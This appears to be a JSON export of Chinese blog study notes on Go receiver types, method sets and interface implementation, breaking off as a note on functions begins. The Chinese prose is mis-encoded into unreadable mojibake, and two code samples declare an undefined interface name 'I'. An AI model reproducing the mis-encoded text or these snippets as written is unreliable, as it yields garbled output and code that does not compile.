å¼€å§‹ã€‚ 1234567891011121314151617181920package main type T struct &#123; a int&#125;func (t T) M1() &#123; t.a = 10&#125;func (t *T) M2() &#123; t.a = 11&#125;func main() &#123; var t T println(t.a) // 0 t.M1() println(t.a) // 0 p := &amp;t p.M2() println(t.a) // 11&#125; åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œä¸ºåŸºç±»å‹åˆ†åˆ«å®šä¹‰äº†ä¸¤ä¸ªæ–¹æ³• M1 å’Œ M2ï¼Œå…¶ä¸­receiver å‚æ•°ç±»å‹åˆ†åˆ«æ˜¯ T å’Œ *Tï¼Œæœ€åä¸¤ä¸ªæ–¹æ³•éƒ½é€šè¿‡å‚æ•° t å¯¹ tçš„æˆå‘˜è¿›è¡Œäº†ä¿®æ”¹ã€‚ é€šè¿‡è¿è¡Œç¤ºä¾‹ä»£ç ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ–¹æ³• M1 å¯¹æˆå‘˜çš„ä¿®æ”¹å¹¶æ²¡æœ‰æˆåŠŸï¼Œè¿˜æ˜¯åŸå€¼ï¼Œè€Œæ–¹æ³• M2 å¯¹æˆå‘˜çš„ä¿®æ”¹æˆåŠŸäº†ã€‚å› æ­¤å¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š å½“ receiver å‚æ•°çš„ç±»å‹ä¸º Tï¼ˆéæŒ‡é’ˆï¼‰æ—¶ï¼šreceiver å‚æ•°å®é™…ä¸Šæ˜¯T ç±»å‹å®ä¾‹çš„å‰¯æœ¬ï¼Œå› æ­¤å¯¹å‚æ•° t è¿›è¡Œä»»ä½•ä¿®æ”¹éƒ½ä¸ä¼šå½±å“åˆ°åŸå®ä¾‹ã€‚ å½“ receiver å‚æ•°çš„ç±»å‹ä¸º *Tï¼ˆæŒ‡é’ˆï¼‰æ—¶ï¼šreceiver å‚æ•°å®é™…ä¸Šæ˜¯T ç±»å‹å®ä¾‹çš„åœ°å€ï¼Œå› æ­¤å¯¹å‚æ•° t è¿›è¡Œä»»ä½•ä¿®æ”¹éƒ½ä¼šå½±å“åˆ°åŸå®ä¾‹ã€‚ äº†è§£äº†ä¸åŒç±»å‹çš„ receiver å‚æ•°å¯¹ Go æ–¹æ³•çš„å½±å“åï¼Œå°±å¯ä»¥æ€»ç»“ä¸€ä¸‹ï¼Œæ—¥å¸¸ç¼–ç ä¸­é€‰æ‹© receiver çš„å‚æ•°ç±»å‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒå“ªäº›åŸåˆ™ã€‚ åŸåˆ™ä¸€å¦‚æœ Go æ–¹æ³•è¦æŠŠå¯¹ receiver å‚æ•°ä»£è¡¨çš„ç±»å‹å®ä¾‹çš„ä¿®æ”¹ï¼Œåæ˜ åˆ°åŸç±»å‹å®ä¾‹ä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥é€‰æ‹© *T ä½œä¸º receiver å‚æ•°çš„ç±»å‹ã€‚ è¿™ä¸ªåŸåˆ™å¾ˆå¥½ç†è§£ï¼Œä¾æ®å®é™…æƒ…å†µé€‰æ‹©åˆé€‚çš„ã€‚ ä¸è¿‡è¿™ä¸ªæ—¶å€™å¯èƒ½ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼šé€‰æ‹©*T ä½œä¸º receiver å‚æ•°çš„ç±»å‹ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯åªèƒ½é€šè¿‡ *T ç±»å‹çš„å®ä¾‹è°ƒç”¨è¯¥æ–¹æ³•ï¼Œè€Œä¸èƒ½é€šè¿‡ T ç±»å‹çš„å®ä¾‹è°ƒç”¨ï¼Ÿ æ­£å¥½è¿™ä¹Ÿæ˜¯ä¸Šä¸€ç¯‡ç¬”è®°ä¸­ï¼Œé—ç•™ä¸‹äº†ä¸€ä¸ªé—®é¢˜ã€‚ å°†ä¸Šé¢çš„ç¤ºä¾‹ä»£ç æ”¹é€ ä¸€ä¸‹ï¼š 123456789101112131415161718192021222324252627type T struct &#123; a int&#125;func (t T) M1() &#123; t.a = 10&#125;func (t *T) M2() &#123; t.a = 11&#125;func main() &#123; var t1 T println(t1.a) // 0 t1.M1() println(t1.a) // 0 t1.M2() println(t1.a) // 11 var t2 = &amp;T&#123;&#125; println(t2.a) // 0 t2.M1() println(t2.a) // 0 t2.M2() println(t2.a) // 11&#125; è¿è¡Œç¤ºä¾‹ä»£ç æŸ¥çœ‹è¾“å‡ºç»“æœï¼Œä¼šå‘ç°ç±»å‹ä¸º T çš„å®ä¾‹ t1ï¼Œä¸ä»…å¯ä»¥è°ƒç”¨ receiver å‚æ•°ç±»å‹ä¸º T çš„æ–¹æ³• M1ï¼Œå®ƒè¿˜å¯ä»¥ç›´æ¥è°ƒç”¨ receiver å‚æ•°ç±»å‹ä¸º *T çš„æ–¹æ³• M2ï¼Œå¹¶ä¸”è°ƒç”¨å®Œ M2 æ–¹æ³•åï¼Œæˆå‘˜çš„å€¼ä¹Ÿè¢«ä¿®æ”¹äº†ã€‚ ç›´æ¥è¯´ç»“è®ºï¼šè¿™æ˜¯å› ä¸º Go ç¼–è¯‘å™¨ï¼Œåœ¨èƒŒåå¸®æˆ‘ä»¬åšäº†è‡ªåŠ¨è½¬æ¢ã€‚ æˆ–è€…è¯´ï¼Œt1.M2() è¿™ç§ç”¨æ³•æ˜¯ Go æä¾›çš„â€œè¯­æ³•ç³–â€ï¼šGo åˆ¤æ–­ t1 çš„ç±»å‹ä¸º Tï¼ˆéæŒ‡é’ˆï¼‰ï¼Œä¹Ÿå°±æ˜¯ä¸æ–¹æ³• M2 çš„ receiver å‚æ•°ç±»å‹ *Tï¼ˆæŒ‡é’ˆï¼‰ ä¸ä¸€è‡´åï¼Œä¼šè‡ªåŠ¨å°† t1.M2() è½¬æ¢ä¸º (&amp;t1).M2()ã€‚ åŒç†ï¼Œt2.M1() è¿™ç§ç”¨æ³•ä¹Ÿæ˜¯å› ä¸º Go ç¼–è¯‘å™¨åœ¨èƒŒååšäº†è½¬æ¢ã€‚ä¹Ÿå°±æ˜¯ï¼ŒGo åˆ¤æ–­ t2 çš„ç±»å‹ä¸º *Tï¼ˆæŒ‡é’ˆï¼‰ï¼Œä¸æ–¹æ³• M1 çš„ receiver å‚æ•°ç±»å‹ Tï¼ˆéæŒ‡é’ˆï¼‰ä¸ä¸€è‡´ï¼Œå°±ä¼šè‡ªåŠ¨å°† t2.M1() è½¬æ¢ä¸º(*t2).M1()ã€‚ ç»“è®ºï¼šæ— è®ºæ˜¯ T ç±»å‹å®ä¾‹ï¼Œè¿˜æ˜¯ *T ç±»å‹å®ä¾‹ï¼Œéƒ½æ—¢å¯ä»¥è°ƒç”¨ receiver ä¸º Tç±»å‹çš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨ receiver ä¸º *T ç±»å‹çš„æ–¹æ³•ã€‚ è¿™é‡Œåšäº†ä¸¤æ¬¡è‡ªåŠ¨è½¬æ¢ï¼Œæ¶‰åŠåˆ°äº†æŒ‡é’ˆçš„è¿ç”¨ï¼Œå¦‚æœä¸ç†è§£ï¼Œå¯ä»¥çœ‹ä¸‹è¿™ç¯‡ç¬”è®°ã€‚ åŸåˆ™äºŒç¬¬ä¸€ä¸ªåŸåˆ™è¯´çš„æ˜¯ï¼Œå½“è¦åœ¨æ–¹æ³•ä¸­å¯¹ receiver å‚æ•°ä»£è¡¨çš„ç±»å‹å®ä¾‹è¿›è¡Œä¿®æ”¹ï¼Œé‚£è¦ä¸º receiver å‚æ•°é€‰æ‹© *T ç±»å‹ï¼Œä½†æ˜¯å¦‚æœä¸éœ€è¦åœ¨æ–¹æ³•ä¸­å¯¹ç±»å‹å®ä¾‹è¿›è¡Œä¿®æ”¹å‘¢ï¼Ÿè¿™ä¸ªæ—¶å€™æ˜¯é€‰æ‹© T ç±»å‹è¿˜æ˜¯ *T ç±»å‹å‘¢ï¼Ÿ é€šå¸¸ä¼šä¸º receiver å‚æ•°é€‰æ‹© T ç±»å‹ï¼Œè¿™æ˜¯å› ä¸ºå¯ä»¥ç¼©çª„å¤–éƒ¨ä¿®æ”¹ç±»å‹å®ä¾‹å†…éƒ¨çŠ¶æ€çš„â€œæ¥è§¦é¢â€ï¼Œä¹Ÿå°±æ˜¯å°½é‡å°‘æš´éœ²å¯ä»¥ä¿®æ”¹ç±»å‹å†…éƒ¨çŠ¶æ€çš„æ–¹æ³•ã€‚ ä¸è¿‡ä¹Ÿæœ‰ä¸€ä¸ªä¾‹å¤–éœ€è¦ä½ ç‰¹åˆ«æ³¨æ„ã€‚è€ƒè™‘åˆ° Go æ–¹æ³•è°ƒç”¨æ—¶ï¼Œreceiver å‚æ•°æ˜¯ä»¥å€¼æ‹·è´çš„å½¢å¼ä¼ å…¥æ–¹æ³•ä¸­çš„ã€‚é‚£ä¹ˆï¼Œå¦‚æœ receiver å‚æ•°ç±»å‹çš„ size è¾ƒå¤§ï¼Œä»¥å€¼æ‹·è´å½¢å¼ä¼ å…¥å°±ä¼šå¯¼è‡´è¾ƒå¤§çš„æ€§èƒ½å¼€é”€ï¼Œè¿™æ—¶æˆ‘ä»¬é€‰æ‹© *T ä½œä¸º receiver ç±»å‹å¯èƒ½æ›´å¥½äº›ã€‚ ä»¥ä¸Šè¿™äº›å¯ä»¥ä½œä¸ºæˆ‘ä»¬é€‰æ‹© receiver å‚æ•°ç±»å‹çš„ç¬¬äºŒä¸ªåŸåˆ™ã€‚ åˆ°è¿™é‡Œï¼Œå¯èƒ½ä¼šè§‰å¾—ï¼Œå‰ä¸¤ä¸ªåŸåˆ™ä¼¼ä¹å¹¶ä¸éš¾ç†è§£ï¼Œè¿™æ˜¯å› ä¸ºè¿™ä¸¤æ¡åªæ˜¯åŸºç¡€åŸåˆ™ï¼Œè¿˜æœ‰ä¸€æ¡æ¯”è¾ƒéš¾çš„åŸåˆ™åœ¨ä¸‹é¢ã€‚ ä¸è¿‡åœ¨è®²è§£è¿™ç¬¬ä¸‰æ¡åŸåˆ™ä¹‹å‰ï¼Œéœ€è¦å…ˆè¦äº†è§£ä¸€ä¸ªåŸºæœ¬æ¦‚å¿µï¼šæ–¹æ³•é›†åˆï¼ˆMethod Setï¼‰ï¼Œå®ƒæ˜¯ç†è§£ç¬¬ä¸‰æ¡åŸåˆ™çš„å‰æã€‚ æ–¹æ³•é›†åˆåœ¨äº†è§£æ–¹æ³•é›†åˆæ˜¯ä»€ä¹ˆä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆé€šè¿‡ä¸€ä¸ªç¤ºä¾‹ï¼Œç›´è§‚äº†è§£ä¸€ä¸‹ä¸ºä»€ä¹ˆè¦æœ‰æ–¹æ³•é›†åˆï¼Œå®ƒä¸»è¦ç”¨æ¥è§£å†³ä»€ä¹ˆé—®é¢˜ï¼š 1234567891011121314type Interface interface &#123; M1() M2()&#125;type T struct&#123;&#125;func (t T) M1() &#123;&#125;func (t *T) M2() &#123;&#125;func main() &#123; var t T var pt *T var i Interface i = pt i = t &#125; ä¸Šé¢çš„ç¤ºä¾‹ä»£ç å®šä¹‰äº†ä¸€ä¸ªæ¥å£ç±»å‹ Interface ä»¥åŠä¸€ä¸ªè‡ªå®šä¹‰ç±»å‹ Tã€‚Interface æ¥å£ç±»å‹åŒ…å«äº†ä¸¤ä¸ªæ–¹æ³• M1 å’Œ M2ï¼Œå®ƒä»¬çš„åŸºç±»å‹éƒ½æ˜¯ Tï¼Œä½†å®ƒä»¬çš„ receiver å‚æ•°ç±»å‹ä¸åŒï¼Œä¸€ä¸ªä¸º Tï¼Œå¦ä¸€ä¸ªä¸º *Tã€‚åœ¨ main å‡½æ•°ä¸­ï¼Œåˆ†åˆ«å°† T ç±»å‹å®ä¾‹ t å’Œ *T ç±»å‹å®ä¾‹ pt èµ‹å€¼ç»™ Interface ç±»å‹å˜é‡ iã€‚ è¿è¡Œç¤ºä¾‹ä»£ç ï¼Œä¼šå‘ç°ç¼–è¯‘å¤±è´¥äº†ï¼š cannot use t (type T) as type Interface in assignment: T does not implement Interface (M2 method has pointer receiver) å¤§æ„æ˜¯ï¼šT æ²¡æœ‰å®ç° Interface ç±»å‹æ–¹æ³•åˆ—è¡¨ä¸­çš„ M2ï¼Œå› æ­¤ç±»å‹ T çš„å®ä¾‹ t ä¸èƒ½èµ‹å€¼ç»™ Interface å˜é‡ åœ¨è§£å†³è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ–¹æ³•é›†åˆã€‚ Go ä¸­ä»»ä½•ä¸€ä¸ªç±»å‹éƒ½æœ‰å±äºè‡ªå·±çš„æ–¹æ³•ï¼Œæˆ–è€…è¯´æ–¹æ³•é›†åˆæ˜¯ Go ç±»å‹çš„ä¸€ä¸ªâ€œå±æ€§â€ã€‚ä½†æ˜¯ä¸æ˜¯æ‰€æœ‰ç±»å‹éƒ½æœ‰è‡ªå·±çš„æ–¹æ³•ï¼Œæ¯”å¦‚ int ç±»å‹å°±æ²¡æœ‰ï¼Œæ‰€ä»¥ï¼Œå¯¹äºæ²¡æœ‰å®šä¹‰æ–¹æ³•çš„Go ç±»å‹ï¼Œç§°å…¶æ‹¥æœ‰ç©ºæ–¹æ³•é›†åˆã€‚ æ¥å£ç±»å‹ç±»å‹ç›¸å¯¹ç‰¹æ®Šï¼Œå®ƒåªä¼šåˆ—å‡ºä»£è¡¨æ¥å£çš„æ–¹æ³•åˆ—è¡¨ï¼Œä¸ä¼šå…·ä½“å®šä¹‰æŸä¸ªæ–¹æ³•ï¼Œå®ƒçš„æ–¹æ³•é›†åˆå°±æ˜¯å®ƒçš„æ–¹æ³•åˆ—è¡¨ä¸­çš„æ‰€æœ‰æ–¹æ³•ï¼Œå› ä¸ºä¸‹é¢é‡ç‚¹è®²è§£çš„æ˜¯éæ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆã€‚ ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹ä¸€ä¸ªéæ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆï¼Œæä¾›äº†ä¸€ä¸ªå‡½æ•° dumpMethodSetï¼Œç”¨äºè¾“å‡ºä¸€ä¸ªéæ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆï¼š 1234567891011121314151617func dumpMethodSet(i interface&#123;&#125;) &#123; dynTyp := reflect.TypeOf(i) if dynTyp == nil &#123; fmt.Printf(\"there is no dynamic type\\n\") return &#125; n := dynTyp.NumMethod() if n == 0 &#123; fmt.Printf(\"%s's method set is empty!\\n\", dynTyp) return &#125; fmt.Printf(\"%s's method set:\\n\", dynTyp) for j := 0; j &lt; n; j++ &#123; fmt.Println(\"-\", dynTyp.Method(j).Name) &#125; fmt.Printf(\"\\n\")&#125; ä¸‹é¢åˆ™åˆ©ç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¯•ç€è¾“å‡ºä¸€ä¸‹ Go åŸç”Ÿç±»å‹ä»¥åŠè‡ªå®šä¹‰ç±»å‹çš„æ–¹æ³•é›†åˆï¼š 1234567891011121314151617type T struct&#123;&#125;func (T) M1() &#123;&#125;func (T) M2() &#123;&#125;func (*T) M3() &#123;&#125;func (*T) M4() &#123;&#125;func main() &#123; var n int dumpMethodSet(n) dumpMethodSet(&amp;n) var t T dumpMethodSet(t) dumpMethodSet(&amp;t)&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œå¾—åˆ°å¦‚ä¸‹è¾“å‡ºï¼š 1234567891011int's method set is empty!*int's method set is empty!main.T's method set:- M1- M2*main.T's method set:- M1- M2- M3- M4 ä»ä¸Šé¢çš„è¾“å‡ºä¸­ï¼Œå¯ä»¥çœ‹åˆ°intã€*int æ˜¯ Go åŸç”Ÿç±»å‹ç”±äºæ²¡æœ‰å®šä¹‰æ–¹æ³•ï¼Œæ‰€ä»¥å®ƒä»¬çš„æ–¹æ³•é›†åˆéƒ½æ˜¯ç©ºçš„ã€‚è€Œè‡ªå®šä¹‰ç±»å‹ T å®šä¹‰äº†æ–¹æ³• M1 å’Œ M2ï¼Œå› æ­¤å®ƒçš„æ–¹æ³•é›†åˆåŒ…å«äº† M1 å’Œ M2ï¼Œç¬¦åˆé¢„æœŸï¼Œä½†æ˜¯ *T çš„æ–¹æ³•é›†åˆé™¤äº†é¢„æœŸçš„ M3 å’Œ M4 ä¹‹å¤–ï¼Œæ€ä¹ˆè¿˜åŒ…å«äº†ç±»å‹ T çš„ M1 å’Œ M2 æ–¹æ³•ï¼Ÿ è¿™æ˜¯å› ä¸ºï¼ŒGo è¯­è¨€è§„å®šï¼Œ*T ç±»å‹çš„æ–¹æ³•é›†åˆåŒ…å«æ‰€æœ‰ä»¥ *T ä¸º receiver å‚æ•°ç±»å‹çš„æ–¹æ³•ï¼Œä»¥åŠæ‰€æœ‰ä»¥ T ä¸º receiver å‚æ•°ç±»å‹çš„æ–¹æ³•ã€‚è¿™å°±æ˜¯è¿™ä¸ªç¤ºä¾‹ä¸­ä¸ºä½• *T ç±»å‹çš„æ–¹æ³•é›†åˆåŒ…å«å››ä¸ªæ–¹æ³•çš„åŸå› ã€‚ è¿™ä¸ªæ—¶å€™å†æ¥çœ‹çœ‹å‰é¢çš„é‚£ä¸ªç¼–è¯‘å¤±è´¥çš„é—®é¢˜ï¼Œæ˜¯ä¸æ˜¯å°±æ‰¾åˆ°åŸå› äº†ã€‚ å¯ä»¥ä½¿ç”¨ dumpMethodSet å‡½æ•°ï¼Œè¾“å‡ºä¸€ä¸‹è¯¥ç¤ºä¾‹ä¸­t ä¸ pt å„è‡ªæ‰€å±ç±»å‹çš„æ–¹æ³•é›†åˆï¼š 12345main.T's method set:- M1*main.T's method set:- M1- M2 ä»è¾“å‡ºç»“æœä¸­ï¼Œå¯ä»¥çœ‹åˆ° Tã€*T å„è‡ªçš„æ–¹æ³•é›†åˆç¡®å®æ˜¯ç¬¦åˆä¸Šé¢çš„ç»“è®ºçš„ã€‚ åˆ°è¿™é‡Œï¼Œå·²ç»çŸ¥é“äº†æ‰€è°“çš„æ–¹æ³•é›†åˆå†³å®šæ¥å£å®ç°çš„å«ä¹‰å°±æ˜¯ï¼šå¦‚æœæŸç±»å‹ T çš„æ–¹æ³•é›†åˆä¸æŸæ¥å£ç±»å‹çš„æ–¹æ³•é›†åˆç›¸åŒï¼Œæˆ–è€…ç±»å‹ T çš„æ–¹æ³•é›†åˆæ˜¯æ¥å£ç±»å‹ I æ–¹æ³•é›†åˆçš„è¶…é›†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯´è¿™ä¸ªç±»å‹ T å®ç°äº†æ¥å£ Iã€‚æˆ–è€…è¯´ï¼Œæ–¹æ³•é›†åˆè¿™ä¸ªæ¦‚å¿µåœ¨ Go è¯­è¨€ä¸­çš„ä¸»è¦ç”¨é€”ï¼Œå°±æ˜¯ç”¨æ¥åˆ¤æ–­æŸä¸ªç±»å‹æ˜¯å¦å®ç°äº†æŸä¸ªæ¥å£ã€‚ æœ‰äº†æ–¹æ³•é›†åˆçš„æ¦‚å¿µåšé“ºå«ï¼Œé€‰æ‹© receiver å‚æ•°ç±»å‹çš„ç¬¬ä¸‰ä¸ªåŸåˆ™ä¹Ÿç›¸å¯¹å¥½ç†è§£äº†ã€‚ åŸåˆ™ä¸‰è¯¥åŸåˆ™çš„é€‰æ‹©ä¾æ®å°±æ˜¯ T ç±»å‹æ˜¯å¦éœ€è¦å®ç°æŸä¸ªæ¥å£ã€‚ å¦‚æœ T ç±»å‹éœ€è¦å®ç°æŸä¸ªæ¥å£çš„å…¨éƒ¨æ–¹æ³•ï¼Œé‚£å°±è¦ä½¿ç”¨ T ä½œä¸º receiver å‚æ•°çš„ç±»å‹ï¼Œæ¥æ»¡è¶³æ¥å£ç±»å‹æ–¹æ³•é›†åˆä¸­çš„æ‰€æœ‰æ–¹æ³•ã€‚ ä¸Šé¢è¿™ä¸ªæ€»ç»“æ²¡æœ‰é—®é¢˜ï¼Œåªæ˜¯æœ‰ä¸€ç‚¹ç»•ï¼Œæƒ³è¡¨è¾¾çš„æ„æ€æ˜¯ï¼Œæœ‰ä¸€ä¸ªæ¥å£ç±»å‹Iï¼Œä¸€ä¸ªè‡ªå®šä¹‰éæ¥å£ç±»å‹Tï¼Œé‚£ä¹ˆä¸‹é¢è¿™æ®µä»£ç æ˜¯okçš„ï¼Œå³t å¯ä»¥èµ‹å€¼ç»™iã€‚ 1234567891011121314type Interface interface &#123; M1() M2()&#125;type T struct&#123;&#125;// ä½¿ç”¨ T ä½œä¸º receiver å‚æ•°çš„ç±»å‹ï¼Œæ¥æ»¡è¶³æ¥å£ç±»å‹æ–¹æ³•é›†åˆä¸­çš„æ‰€æœ‰æ–¹æ³•func (t T) M1() &#123;&#125;func (t T) M2() &#123;&#125;func main()&#123; var i I var t T i = t // ç¼–è¯‘æˆåŠŸ&#125; ä½†æ˜¯å¦‚æœæ˜¯ *T å®ç°äº†Iï¼Œé‚£ä¹ˆå°±ä¸èƒ½ä¿è¯ T ä¹Ÿä¼šå®ç° Iï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢è¿™æ®µä»£ç ä¼šç¼–è¯‘å¤±è´¥ã€‚ 1234567891011121314type Interface interface &#123; M1() M2()&#125;type T struct&#123;&#125;func (t T) M1() &#123;&#125;// ä½¿ç”¨ *T ä½œä¸º receiver å‚æ•°çš„ç±»å‹func (t *T) M2() &#123;&#125;func main()&#123; var i I var t T i = t // ç¼–è¯‘å¤±è´¥&#125; å› æ­¤æˆ‘ä»¬åœ¨è®¾è®¡ä¸€ä¸ªè‡ªå®šä¹‰ç±»å‹Tçš„æ–¹æ³•æ—¶ï¼Œè€ƒè™‘æ˜¯å¦Téœ€è¦å®ç°æŸä¸ªæ¥å£ã€‚å¦‚æœéœ€è¦ï¼Œæ–¹æ³•receiverå‚æ•°çš„ç±»å‹åº”è¯¥æ˜¯Tã€‚å¦‚æœTä¸éœ€è¦ï¼Œé‚£ä¹ˆç”¨*Tæˆ–Tå°±éƒ½å¯ä»¥äº†ã€‚ æ€»ç»“ å½“ receiver å‚æ•°çš„ç±»å‹ä¸º T æ—¶ï¼Œå¯¹receiver å‚æ•°çš„ä»»ä½•ä¿®æ”¹éƒ½ä¸ä¼šå½±å“åˆ°åŸå®ä¾‹ å½“ receiver å‚æ•°çš„ç±»å‹ä¸º *T æ—¶ï¼Œå¯¹receiver å‚æ•°çš„ä»»ä½•ä¿®æ”¹éƒ½ä¼šå½±å“åˆ°åŸå®ä¾‹ å®é™…è¿›è¡Œ Go æ–¹æ³•è®¾è®¡æ—¶ï¼Œé¦–å…ˆåº”è¯¥è€ƒè™‘åŸåˆ™ä¸‰ï¼Œå…¶æ¬¡æ‰æ˜¯åŸåˆ™ä¸€å’ŒåŸåˆ™äºŒ æ–¹æ³•é›†åˆæ˜¯ç”¨æ¥åˆ¤æ–­æŸä¸€ç±»å‹æ˜¯å¦å®ç°äº†æŸæ¥å£çš„å”¯ä¸€æ‰‹æ®µ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”å‡½æ•°","slug":"go-language-study-notes-function","date":"2022-10-30T15:58:05.000Z","updated":"2023-02-18T03:28:33.588Z","comments":true,"path":"go-language-study-notes-function/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-function/","excerpt":"åœ¨ Go è¯­è¨€ä¸­ï¼Œå‡½æ•°æ˜¯å”¯ä¸€ä¸€ç§åŸºäºç‰¹å®šè¾“å…¥ï¼Œå®ç°ç‰¹å®šä»»åŠ¡å¹¶å¯è¿”å›ä»»åŠ¡æ‰§è¡Œç»“æœçš„ä»£ç å—ï¼Œå æ®ç€é‡è¦çš„ä½ç½®ã€‚","text":"åœ¨ Go è¯­è¨€ä¸­ï¼Œå‡½æ•°æ˜¯å”¯ä¸€ä¸€ç§åŸºäºç‰¹å®šè¾“å…¥ï¼Œå®ç°ç‰¹å®šä»»åŠ¡å¹¶å¯è¿”å›ä»»åŠ¡æ‰§è¡Œç»“æœçš„ä»£ç å—ï¼Œå æ®ç€é‡è¦çš„ä½ç½®ã€‚ å‡½æ•°åœ¨ Go ä¸­ï¼Œå®šä¹‰ä¸€ä¸ªå‡½æ•°æœ€å¸¸ç”¨çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨å‡½æ•°å£°æ˜ï¼Œä»¥Go æ ‡å‡†åº“ fmt åŒ…æä¾›çš„ Fprintf å‡½æ•°ä¸ºä¾‹ï¼Œçœ‹ä¸€ä¸‹ä¸€ä¸ªæ™®é€š Go å‡½æ•°çš„å£°æ˜é•¿ä»€ä¹ˆæ ·ï¼š å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå‡½æ•°æ˜¯ç”±äº”éƒ¨åˆ†ç»„æˆï¼Œä¸‹é¢ä¸€ä¸€ä»‹ç»ã€‚ func å…³é”®å­—Go å‡½æ•°å£°æ˜å¿…é¡»ä»¥ func å…³é”®å­—å¼€å§‹ã€‚ å‡½æ•°åå‡½æ•°åæ˜¯æŒ‡ä»£å‡½æ•°å®šä¹‰çš„æ ‡è¯†ç¬¦ï¼Œå‡½æ•°å£°æ˜åï¼Œå¯ä»¥é€šè¿‡å‡½æ•°åè¿™ä¸ªæ ‡è¯†æ¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚ åœ¨åŒä¸€ä¸ª Go åŒ…ä¸­ï¼Œå‡½æ•°åæ˜¯å”¯ä¸€çš„ï¼Œå¦‚æœé‡å¤å®šä¹‰åˆ™ä¼šç¼–è¯‘å¤±è´¥ã€‚ åŒæ ·çš„ï¼Œå‡½æ•°çš„å®šä¹‰ï¼Œä¹Ÿéµå®ˆ Go æ ‡è¯†ç¬¦çš„å¯¼å‡ºè§„åˆ™ï¼Œä¹Ÿå°±æ˜¯ï¼Œå¦‚æœå‡½æ•°åçš„é¦–å­—æ¯æ˜¯å¤§å†™è¡¨ç¤ºè¯¥å‡½æ•°å¯ä»¥åœ¨åŒ…å¤–ä½¿ç”¨ï¼Œåä¹‹ï¼Œå°å†™çš„å°±åªåœ¨åŒ…å†…ä½¿ç”¨ã€‚ å‚æ•°åˆ—è¡¨å‚æ•°åˆ—è¡¨ä¸­å£°æ˜äº†å°†è¦åœ¨å‡½æ•°ä½“ä¸­ä½¿ç”¨çš„å„ä¸ªå‚æ•°ã€‚ åœ¨å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œå‡½æ•°å‚æ•°é€šå¸¸æ˜¯å…è®¸å®šä¹‰é»˜è®¤å€¼çš„ï¼Œä½†æ˜¯åœ¨ Go è¯­è¨€ä¸­ï¼Œå‡½æ•°å‚æ•°ä¸æ”¯æŒé»˜è®¤å€¼ã€‚ å‚æ•°ååœ¨å‰ï¼Œå‚æ•°ç±»å‹åœ¨åï¼Œè¿™å’Œå˜é‡å£°æ˜ä¸­å˜é‡åä¸ç±»å‹çš„æ’åˆ—æ–¹å¼æ˜¯ä¸€è‡´çš„ã€‚ å¦å¤–ï¼ŒGo å‡½æ•°ä¹Ÿæ˜¯æ”¯æŒå˜é•¿å‚æ•°ï¼Œåé¢è¯¦ç»†ä»‹ç»ã€‚ è¿”å›å€¼åˆ—è¡¨è¿”å›å€¼æ‰¿è½½äº†å‡½æ•°æ‰§è¡Œåè¦è¿”å›ç»™è°ƒç”¨è€…çš„ç»“æœã€‚ å¦‚æœä¸ä»…å£°æ˜äº†è¿”å›å€¼çš„ç±»å‹ï¼Œè¿˜å£°æ˜äº†è¿”å›å€¼çš„åç§°ï¼Œé‚£ä¹ˆè¿™ç§è¿”å›å€¼è¢«ç§°ä¸ºå…·åè¿”å›å€¼ã€‚ å‡½æ•°ä½“å‡½æ•°ä½“æ˜¯å‡½æ•°çš„å…·ä½“å®ç°ã€‚ å‡½æ•°ä½“å†…å¹¶ä¸æ˜¯ä¸€å®šéœ€è¦æœ‰å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®šä¹‰ä¸€ä¸ªè¿™æ ·çš„å‡½æ•°ä¹Ÿæ˜¯åˆæ³•çš„ï¼š 1func foo(arr [5]int) &#123;&#125; å‡½æ•°å£°æ˜ä¸­çš„ func å…³é”®å­—ã€å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼åˆ—è¡¨å…±åŒæ„æˆäº†å‡½æ•°ç±»å‹ã€‚è€Œå‚æ•°åˆ—è¡¨ä¸è¿”å›å€¼åˆ—è¡¨çš„ç»„åˆä¹Ÿè¢«ç§°ä¸ºå‡½æ•°ç­¾åï¼Œå®ƒæ˜¯å†³å®šä¸¤ä¸ªå‡½æ•°ç±»å‹æ˜¯å¦ç›¸åŒçš„å†³å®šå› ç´ ã€‚ å¦‚æœä¸¤ä¸ªå‡½æ•°ç±»å‹çš„å‡½æ•°ç­¾åæ˜¯ç›¸åŒçš„ï¼Œå³ä¾¿å‚æ•°åˆ—è¡¨ä¸­çš„å‚æ•°åï¼Œä»¥åŠè¿”å›å€¼åˆ—è¡¨ä¸­çš„è¿”å›å€¼å˜é‡åéƒ½æ˜¯ä¸åŒçš„ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªå‡½æ•°ç±»å‹ä¹Ÿæ˜¯ç›¸åŒç±»å‹ï¼Œæ¯”å¦‚ä¸‹é¢ä¸¤ä¸ªå‡½æ•°ç±»å‹ï¼š 123456func (a 